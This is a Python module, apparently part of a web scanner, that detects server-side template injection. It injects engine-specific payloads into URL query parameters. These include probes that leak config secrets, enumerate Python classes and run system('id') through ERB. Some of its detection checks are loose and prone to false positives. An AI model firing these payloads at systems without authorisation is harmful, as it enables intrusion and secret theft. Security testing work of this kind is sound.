"""GECKO APOCALYPSE - SSTI Detector (Jinja2, Twig, Freemarker, Velocity, Smarty, Handlebars)"""

import asyncio
import re
from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse

import aiohttp


class SSTIDetector:
    def __init__(self, session, config, db):
        self.session = session
        self.config = config
        self.db = db
        self.payloads = {
            "jinja2": [
                "{{7*7}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ],
            "twig": ["{{7*7}}", '{{_self.env.getFilter("upper")}}'],
            "freemarker": ["${7*7}", '${7*"7"}'],
            "velocity": ["${{7*7}}", "#set($x=7*7)$x"],
            "smarty": ["{$smarty.version}", "{7*7}"],
            "handlebars": ['{{#with "s" as |string|}}{{#with "e"}}{{/with}}{{/with}}'],
            "erb": ["<%= 7*7 %>", '<%= system("id") %>'],
            "pug": ["#{7*7}"],
        }

    async def scan(self, url, content, headers, response):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return findings
        for param in params:
            for engine, payloads in self.payloads.items():
                for payload in payloads:
                    r = await self._test(url, param, payload, engine)
                    if r:
                        findings.append(r)
                        break
                if findings:
                    break
        return findings

    async def _test(self, url, param, payload, engine):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        test_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
        try:
            async with self.session.get(
                test_url, timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                c = await r.text(errors="ignore")
                if self._verify(payload, c):
                    return {
                        "type": "Server-Side Template Injection",
                        "severity": "CRITICAL",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Engine: {engine}",
                        "description": f"SSTI in {engine}",
                        "remediation": "Never render user input in templates",
                        "cwe": "CWE-94",
                        "owasp": "A03:2021 - Injection",
                    }
        except:
            pass

    def _verify(self, payload, resp):
        if "7*7" in payload and "49" in resp:
            return True
        if '7*"7"' in payload and "7777777" in resp:
            return True
        if "config.items()" in payload and "SECRET_KEY" in resp:
            return True
        if "__subclasses__" in payload and "<class" in resp:
            return True
        if "smarty.version" in payload and re.search(r"\d+\.\d+", resp):
            return True
        return False
